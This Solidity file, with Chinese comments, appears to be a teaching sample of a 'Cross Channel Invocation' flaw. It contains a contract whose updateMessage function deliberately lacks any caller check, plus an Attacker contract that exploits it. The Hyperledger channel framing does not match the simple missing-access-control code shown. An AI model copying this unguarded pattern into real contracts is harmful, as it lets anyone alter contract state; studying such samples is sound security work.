// SPDX-License-Identifier: MIT
// Solidity version: 測試此漏洞與版本無關，但需要 Solidity >=0.8.0 支援最新語法
pragma solidity >=0.8.0;

/*
    漏洞名稱：Cross Channel Invocation
    描述：
      某些區塊鏈平台（例如 Hyperledger Fabric）允許合約之間進行互調呼叫；
      若跨通道（channel）互呼，可能因訊息來源無法被正確驗證導致安全問題。

    此範例中，VulnerableContract 的 updateMessage 函式預期只能由特定通道呼叫，
    但未檢查呼叫者來源 (例如 msg.sender) 是否屬於授權通道，
    因此攻擊者合約可以從另一通道偽造呼叫，以未授權方式更改狀態變數 lastMessage。

    攻擊步驟：
      1. 部署 VulnerableContract。
      2. 部署 Attacker 合約，並傳入 VulnerableContract 的位址（請注意此處修正為 address payable 來符合類型轉換要求）。
      3. 呼叫 Attacker.attack()，該函式將調用 VulnerableContract.updateMessage()，並將 lastMessage 更新為攻擊者指定的內容（如："Attacked via Cross Channel Invocation"）。

    注意：實際跨通道呼叫在不同平台會有額外機制，但此處以簡化版展示漏洞概念。
*/

contract VulnerableContract {
    // 狀態變數：紀錄最後接收到的訊息
    string public lastMessage; // 漏洞重點：此變數未加入來源驗證

    // 漏洞函式：未進行跨通道來源驗證，允許任何呼叫者更新訊息
    function updateMessage(string memory _message) public {
        // 攻擊重點：未檢查 msg.sender 是否屬於合法通道，因此容易被跨通道或未授權呼叫利用
        lastMessage = _message;
    }

    // 接收 Ether 的 fallback 實作
    receive() external payable {}
}

// 攻擊合約：用以展示攻擊者如何透過跨通道調用未受保護的函式
contract Attacker {
    VulnerableContract public target;

    // 修改處：將 _target 的型態調整為 address payable，解決編譯器的型別轉換錯誤
    constructor(address payable _target) {
        target = VulnerableContract(_target);
    }

    // 攻擊方法：偽造跨通道呼叫，修改 VulnerableContract 的狀態
    function attack() public {
        // 攻擊重點：直接呼叫 target.updateMessage() 來更改 lastMessage
        target.updateMessage("Attacked via Cross Channel Invocation");
    }
}
